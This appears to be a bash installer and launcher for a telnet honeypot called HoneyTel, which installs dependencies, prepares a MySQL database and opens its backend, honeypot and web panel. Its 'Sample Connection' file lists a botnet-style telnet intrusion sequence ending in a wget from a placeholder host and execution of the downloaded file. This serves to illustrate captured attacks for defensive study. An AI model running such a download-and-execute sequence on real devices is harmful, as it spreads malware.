#!/bin/bash
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
LBBLUE='\e[104m'
RED='\033[0;31m'
LGRY='\033[0;37m'
INV='\e[7m'
BRED='\033[1;31m'
UPURPLE='\033[4;35m'
UBLUE='\033[4;34m'
URED='\033[4;31m'

setup(){
	cd /opt/HoneyTel
	sudo bash create_config.sh
	sudo pip install -r requirements.txt
	if [[ -f '.info' ]]; then
		sleep 1
	else
		sudo touch .info
		sudo chown $USER:$USER .info
		echo "Sample Connection" >> .info
		echo "" >> .info
		echo "enable" >> .info
		echo "shell" >> .info
		echo "sh" >> .info
		echo "cat /proc/mounts; /bin/busybox PEGOK" >> .info
		echo "cd /tmp; (cat .s || cp /bin/echo .s); /bin/busybox PEGOK" >> .info
		echo "nc; wget; /bin/busybox PEGOK" >> .info
		echo "(dd bs=52 count=1 if=.s || cat .s)" >> .info
		echo "/bin/busybox PEGOK" >> .info
		echo "rm .s; wget http://example.com:4636/.i; chmod +x .i; ./.i; exit" >> .info
		sleep 1
		sudo apt-get install python-setuptools python-werkzeug \
					python-flask python-sqlalchemy \
					python-requests python-decorator python-dnspython \
					python-ipaddress python-simpleeval python-yaml
	fi
	if [[ -f '.setup' ]]; then
		sleep 1
	else
		sudo touch .setup
		sudo chown $USER:$USER .setup
		echo -e "When mysql opens in terminal please enter the following info \n making changes where necessary \n" >> .setup
		echo "CREATE DATABASE telhoney CHARACTER SET latin1 COLLATE latin1_swedish_ci;" >> .setup
		echo "grant all privileges on telhoney.* to telhoney@localhost identified by \"YOUR_PASSWORD\";" >> .setup
		echo "flush privileges;" >> .setup
		sleep 1
		echo -e "${W}An xterm window will open with instructions for the MYSQL database setup${NC}"
		sleep 2
		xterm -e cat .setup
		sleep 5
		sudo service mysql start
		sudo mysql -l root
		sleep 2
		echo -e "${W}Set your login credentials upon first using HoneyTel HTTP Panel \nThese are saved in /opt/HoneyTel/config.yaml${NC}"
	fi
	sudo echo "complete" >> .setup
}

if [[ -f '.setup' ]]; then
	sleep 1
else
	setup
fi
cd /opt/HoneyTel
echo -e "${RED}"
figlet HoneyTel
echo -e "${NC}"
echo -e "${W}3 Windows will open in xterm, leaving them running until you are finished with HoneyTel${NC}"
sleep 2
kdialog --geometry 600x800 --textbox .info &
cat .info
xterm -e sudo python backend.py &
xterm -e sudo python honeypot.py &
sleep 10
xterm -e firefox http://127.0.0.1:5000 &
sleep 2
reset
cd /opt/sifter
./sifter -m

##########################______________ VGhlIERlYWQgQnVubnkgQ2x1Yg== ______________##########################